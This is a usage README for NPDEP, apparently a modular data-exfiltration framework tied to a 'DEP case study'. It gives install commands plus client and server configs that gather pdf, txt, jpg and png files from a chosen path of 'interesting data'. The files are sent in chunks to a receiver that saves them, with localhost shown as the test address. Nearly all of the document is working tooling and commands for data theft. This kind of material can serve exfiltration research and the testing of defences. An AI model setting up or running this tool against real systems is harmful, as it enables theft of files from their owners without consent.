# Usage

[Start](../README.md)

- [Usage](#usage)
  - [Introduction](#introduction)
  - [Execution](#execution)

## Introduction

The following steps describe how to use NPDEP with modules like the ones created in the [DEP case study](case_study.md).

## Execution

The following commands are installing all necessary components:

```cmd
pip install npdep-client
pip install npdep-server
pip install npdep-receiver
pip install npdep-sourcing
pip install npdep-transfer
```

After installation you need to create a config file for `npdep-client`:

```json
// npdep-client-config.json
{   
    "sourcing": {
        "module": {
            "name": "FoiModule",
            "options": {
                "files": ["pdf, txt, jpg, png"], // Use file types of your choice
                "path": "path/to/interesting/data" // Change to a path you want 
                                                   // to search
            }
        }
    },
    "transfer": {
        "module": {
            "name": "DepFileExfiltration",
            "options": {
                "ip": "127.0.0.1", // For testing purposes we use localhost here
                "port": 6666,
                "pkgSize": 1321
            }
        }
    }
}
```

As well as a config file for `npdep-server`:

```json
// npdep-server-config.json
{   
    "modules": [
        {
            "name": "DepReceiver",
            "options": {
                "ip": "127.0.0.1", // For testing purposes we use localhost here
                "port": 6666,
                "savePath": "path/to/npdep/dep" // Change to a path you
                                                // want to save the exfiltrated
                                                // files
            }
        }
    ]
}
```

With the following command we are now going to use `FoiModule` sourcing module to collect all `pdf|txt|jpg|png` file paths under `path/to/interesting/data` and providing them to `DepFileExfiltration` transfer module sending the data to `127.0.0.1:6666` with a chunk size of `1321`.

To start the server use the following command:

```cmd
python3 -m npdep-server -c npdep-server-config.json
```

As soon as the server is up and running use the following command to start the client:

```cmd
python3 -m npdep-client -c npdep-client-config.json
```
After client finished it's work, the exfiltrated `pdf|txt|jpg|png` files are now located under `path/to/npdep/dep` and from this directory saved under they original path. 